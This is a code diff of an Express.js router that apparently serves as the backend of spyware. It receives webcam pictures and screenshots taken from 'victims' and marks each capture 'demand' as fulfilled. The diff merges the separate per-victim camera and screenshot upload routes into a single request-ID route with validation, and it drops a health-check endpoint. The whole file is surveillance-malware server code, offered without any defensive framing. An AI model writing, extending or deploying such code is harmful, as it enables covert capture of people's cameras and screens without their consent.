@@ -3,6 +3,7 @@ import Request from '../models/requestModel.js';
 import multer from 'multer';
 
 const router = Router();
+
 let storage = multer.diskStorage({
     destination: function (req, file, cb) {
       cb(null, './uploads')
@@ -12,50 +13,50 @@ let storage = multer.diskStorage({
       let extension = extArray[extArray.length - 1];
       cb(null, file.fieldname + '-' + Date.now()+ '.' +extension)
     }
-  })
-const upload = multer({ storage: storage })
+});
+
+const upload = multer({ storage: storage });
 
 /**
- * Handle camera picture upload
- * @route POST /api/fulfill/cameraPicture/:victimId
+ * Handle all types of fulfillment
+ * @route POST /api/fulfill/:requestId
  */
-router.post('/camera/:victimId', upload.single('img'), async (req, res, next) => {
+router.post('/:requestId', upload.single('img'), async (req, res, next) => {
     try {
-        const updatedRequest = await Request.findOneAndUpdate(
-            { victimId: req.params.victimId, _id: req.body.requestId, demand: 'camera' },
-            { fulfilled: true, fulfilledAt: req.file.destination + '/' + req.file.filename },
-            { new: true }
-        );
+        const { requestId } = req.params;
+        
+        // Fetch the request from the database
+        const request = await Request.findById(requestId);
+        
+        if (!request) {
+            return res.status(404).json({ message: 'Request not found' });
+        }
+        
+        // Check if the request has already been fulfilled
+        if (request.fulfilled) {
+            return res.status(400).json({ message: 'Request has already been fulfilled' });
+        }
+        
+        // Process the request based on its demand
+        if (request.demand === 'camera' || request.demand === 'screenshot') {
+            if (!req.file) {
+                return res.status(400).json({ message: 'No image file uploaded' });
+            }
+            
+            // Update the request
+            request.fulfilled = true;
+            request.fulfilledAt = req.file.destination + '/' + req.file.filename;
+        } else {
+            return res.status(400).json({ message: 'Invalid demand type' });
+        }
+        
+        // Save the updated request
+        const updatedRequest = await request.save();
+        
         res.json(updatedRequest);
     } catch (err) {
         next(err);
     }
-});
-
-/**
- * Handle screenshot upload
- * @route POST /api/fulfill/screenshot/:victimId
- */
-router.post('/screenshot/:victimId', upload.single('img'), async (req, res, next) => {
-    try {
-        const updatedRequest = await Request.findOneAndUpdate(
-            { victimId: req.params.victimId, _id: req.body.requestId, demand: 'screenshot' },
-            { fulfilled: true, fulfilledAt: req.file.destination + '/' + req.file.filename },
-            { new: true }
-        );
-        res.json(updatedRequest);
-    } catch (err) {
-        next(err);
-    }
-});
-
-
-/**
- * Health check for fulfillment route
- * @route GET /api/fulfill/health
- */
-router.get('/health', (req, res) => {
-    res.send('Fulfillment route OK');
 });
 
 export default router;
